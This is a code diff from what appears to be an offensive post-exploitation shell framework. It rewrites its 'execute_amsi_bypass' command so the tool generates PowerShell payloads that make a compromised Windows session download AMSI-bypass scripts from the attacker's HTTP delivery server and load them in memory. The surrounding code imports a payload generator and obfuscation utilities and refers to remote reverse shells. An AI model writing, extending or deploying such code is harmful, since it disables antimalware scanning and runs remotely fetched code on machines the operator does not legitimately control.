@@ -3,6 +3,7 @@ import re
 import subprocess
 from commands.abstract_command import AbstractCommand
 from shell_utils.shell_factory import ShellTypes
+from utils.minishh_utils import MinishhUtils
 from utils.print_utils import Printer
 from utils.pwsh_utils import ObfUtil
 from utils.term_manager import Term
@@ -10,7 +11,9 @@ from config.config import AppConfig
 from prompt_toolkit.shortcuts import CompleteStyle
 from prompt_toolkit.completion import NestedCompleter, PathCompleter, WordCompleter
 from prompt_toolkit import PromptSession
+from http_handler.http_server import HttpDeliveringServer
 from commands.toolbar import MinishToolbar
+from utils.generator.payload_generator import Generator
 
 class SessionCommand(AbstractCommand):
     """
@@ -41,6 +44,7 @@ class SessionCommand(AbstractCommand):
         self.session_in_use = session_in_use
         self.full_cli = None
         self.init_session()
+        self.generator = Generator()
 
     def init_session(self):
         """Init the prompt session with  the needed completer"""
@@ -159,10 +163,17 @@ class SessionCommand(AbstractCommand):
         print()
 
     def execute_amsi_bypass(self, *args):
+        """Create a payload to download amsi scripts and load them in memory"""
         payload = []
-        payload.append(self.session_in_use.download_server.download_link_powershell(AppConfig.get("amsi_route1", "Routes")))
-        payload.append(self.session_in_use.download_server.download_link_powershell(AppConfig.get("amsi_route2", "Routes")))
-        # payload.append(self.session_in_use.download_server.download_link_powershell(AppConfig.get("etw_route", "Routes"))) # Route to enable in order to disable etw
+        amsi_scripts = MinishhUtils.recover_scripts("amsi_bypass_scripts", "Powershell")
+        for script in amsi_scripts:
+            script_route = HttpDeliveringServer.get_route_for_script(script)
+            # Emulate payload for remote reverse shell
+            payload.append(self.generator.generate_payload("generate -t powershell",
+                ip=AppConfig.get("default_ip_address"),
+                port=AppConfig.get("port", "HttpServer"),
+                route=script_route))
+
         self.command_executor.exec_all_no_result(payload, shell_type=ShellTypes.Powershell)
         Printer.log("Run: [i]AmsiUtils[/i] and expect a powershell error")
 
